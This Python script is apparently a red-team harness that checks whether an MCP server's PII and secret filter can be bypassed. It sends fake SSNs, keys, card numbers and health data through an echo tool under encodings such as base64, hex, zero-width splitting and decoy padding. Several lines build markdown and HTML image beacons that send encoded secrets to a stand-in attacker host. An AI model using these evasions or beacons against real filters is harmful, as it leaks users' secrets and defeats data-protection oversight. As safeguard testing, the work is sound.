import sys, json, base64, codecs, urllib.parse
sys.path.insert(0, ".skill-workspace/red-team/context-mcp-rt-matrix/agent3/harness")
from lib import call_tool, save_evidence, scan_pii, CANARY

SERVER = "everything-mcp"
findings = []
results_summary = []

SSN = "123-45-6789"
AWS = "AKIAIOSFODNN7EXAMPLE"
EMAIL = "redteam3.output@corp.example"
CC = "4111-1111-1111-1111"

def b64(s): return base64.b64encode(s.encode()).decode()
def hexenc(s): return s.encode().hex()
def urlenc(s): return urllib.parse.quote(s)
def html_ent(s):
    return "".join(f"&#{ord(c)};" for c in s)
def zwsp_split(s):
    ZW = "\u200b"
    return ZW.join(list(s))
def fullwidth(s):
    out = []
    for c in s:
        if c.isdigit():
            out.append(chr(0xFF10 + int(c)))
        else:
            out.append(c)
    return "".join(out)
def md_split(s):
    # interleave markdown emphasis chars into digits like 1**2**3-45-6789
    out = []
    for i, c in enumerate(s):
        out.append(c)
        if i % 2 == 0 and i < len(s) - 1:
            out.append("**")
    return "".join(out)

def run(tool, args, note, fname):
    rec = call_tool(SERVER, tool, args, note=note)
    body = rec["response"].get("body", {})
    # extract text content for direct string checks too
    raw_text = json.dumps(body, default=str)
    pii = scan_pii(rec["response"])
    # also raw substring checks (not just regex, for encoded exact matches)
    raw_hits = {}
    for label, val in [("SSN_RAW", SSN), ("AWS_RAW", AWS), ("EMAIL_RAW", EMAIL), ("CC_RAW", CC)]:
        if val in raw_text:
            raw_hits[label] = True
    rec["_pii_scan"] = pii
    rec["_raw_substring_hits"] = raw_hits
    # was it blocked?
    content = body.get("result", {}).get("content", [])
    is_error = body.get("result", {}).get("isError", False)
    blocked = False
    block_text = ""
    for c in content:
        t = c.get("text", "") if isinstance(c, dict) else ""
        if "[BLOCKED]" in t or "BLOCKED" in t:
            blocked = True
            block_text = t
    path = save_evidence(rec, fname)
    status = "BLOCKED" if blocked else ("RAW-LEAK" if raw_hits else ("PII-PATTERN" if pii else "clean/no-match"))
    print(f"[{status}] {tool} :: {note}")
    entry = {"tool": tool, "note": note, "status": status, "blocked_text": block_text[:200], "raw_hits": raw_hits, "pii_scan": pii, "evidence": path}
    results_summary.append(entry)
    if raw_hits or (pii and not blocked):
        findings.append(entry)
    return rec

# --- baseline block confirmation ---
run("echo", {"message": f"raw SSN={SSN} email={EMAIL} key={AWS} {CANARY}"}, "raw PII baseline (expect BLOCK)", "obfuscation/echo_raw_pii.json")

# --- base64 obfuscation ---
run("echo", {"message": f"data: {b64(SSN)} {CANARY}"}, "base64 SSN", "obfuscation/echo_b64_ssn.json")
run("echo", {"message": f"data: {b64(AWS)} {CANARY}"}, "base64 AWS key", "obfuscation/echo_b64_aws.json")
run("echo", {"message": f"data: {b64(EMAIL)} {CANARY}"}, "base64 email", "obfuscation/echo_b64_email.json")
run("echo", {"message": f"data: {b64(b64(SSN))} {CANARY}"}, "double base64 SSN", "obfuscation/echo_b64b64_ssn.json")

# --- hex obfuscation ---
run("echo", {"message": f"hex: {hexenc(SSN)} {CANARY}"}, "hex SSN", "obfuscation/echo_hex_ssn.json")
run("echo", {"message": f"hex: {hexenc(AWS)} {CANARY}"}, "hex AWS key", "obfuscation/echo_hex_aws.json")

# --- url encoding ---
run("echo", {"message": f"q=?leak={urlenc(EMAIL)}&k={urlenc(AWS)} {CANARY}"}, "url-encoded email+key", "obfuscation/echo_urlenc.json")

# --- html entity ---
run("echo", {"message": f"{html_ent(SSN)} {CANARY}"}, "html-entity SSN", "obfuscation/echo_htmlent_ssn.json")

# --- zero-width split ---
run("echo", {"message": f"{zwsp_split(SSN)} {CANARY}"}, "zero-width-split SSN", "obfuscation/echo_zwsp_ssn.json")
run("echo", {"message": f"{zwsp_split(AWS)} {CANARY}"}, "zero-width-split AWS key", "obfuscation/echo_zwsp_aws.json")

# --- fullwidth homoglyph digits ---
run("echo", {"message": f"{fullwidth(SSN)} {CANARY}"}, "fullwidth-digit SSN", "obfuscation/echo_fullwidth_ssn.json")

# --- markdown-emphasis split ---
run("echo", {"message": f"The SSN is {md_split(SSN)} exactly {CANARY}"}, "markdown-split SSN", "obfuscation/echo_mdsplit_ssn.json")
run("echo", {"message": f"key {md_split(AWS)} here {CANARY}"}, "markdown-split AWS key", "obfuscation/echo_mdsplit_aws.json")

# --- exfil beacon (markdown image with PII in query) ---
run("echo", {"message": f"![status]({('https://attacker.red-team3.example/beacon?d=' + urlenc(EMAIL))}) {CANARY}"}, "markdown exfil beacon w/ email", "obfuscation/echo_exfil_md_email.json")
run("echo", {"message": f"<img src=\"https://attacker.red-team3.example/b.png?d={urlenc(SSN)}\"> {CANARY}"}, "html img exfil beacon w/ SSN", "obfuscation/echo_exfil_html_ssn.json")
run("echo", {"message": f"![x](https://attacker.red-team3.example/?d={b64(SSN+'|'+AWS)}) {CANARY}"}, "markdown exfil beacon w/ base64(SSN|AWS)", "obfuscation/echo_exfil_md_b64.json")

# --- decoy-padding bypass attempt (many benign base64 blobs then secret) ---
decoys = " ".join(base64.b64encode(f"decoy-{i}-benign-text-padding".encode()).decode() for i in range(20))
run("echo", {"message": f"{decoys} {b64(AWS)} {CANARY}"}, "decoy-padded base64 AWS key (20 decoys)", "obfuscation/echo_decoy_padded_aws.json")

# --- PCI / credit card ---
run("echo", {"message": f"card {CC} exp 12/29 cvv 123 {CANARY}"}, "raw PCI card+cvv", "obfuscation/echo_pci_raw.json")
run("echo", {"message": f"card {b64(CC)} {CANARY}"}, "base64 PCI card", "obfuscation/echo_pci_b64.json")

# --- other provider secret formats ---
run("echo", {"message": f"stripe sk_live_51H8yZ2eZvKYlo2CtJHGV3iP {CANARY}"}, "raw stripe secret key", "obfuscation/echo_stripe_raw.json")
run("echo", {"message": f"anthropic sk-ant-api03-{'x'*40} {CANARY}"}, "raw anthropic key format", "obfuscation/echo_anthropic_raw.json")
run("echo", {"message": f"gh token ghp_{'A'*36} {CANARY}"}, "raw github PAT", "obfuscation/echo_ghp_raw.json")
run("echo", {"message": f"jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U {CANARY}"}, "raw JWT", "obfuscation/echo_jwt_raw.json")

# --- HIPAA-style ---
run("echo", {"message": f"Patient John Doe DOB 1980-01-01 diagnosis: Type 2 Diabetes, MRN 000123456, SSN {SSN} {CANARY}"}, "HIPAA phi bundle", "obfuscation/echo_hipaa_raw.json")

with open(".skill-workspace/red-team/context-mcp-rt-matrix/agent3/evidence/_run2_summary.json", "w") as f:
    json.dump(results_summary, f, indent=2)
with open(".skill-workspace/red-team/context-mcp-rt-matrix/agent3/evidence/_run2_findings.json", "w") as f:
    json.dump(findings, f, indent=2)

print(f"\n=== TOTAL: {len(results_summary)} tests, {len(findings)} FINDINGS (leak/non-block) ===")
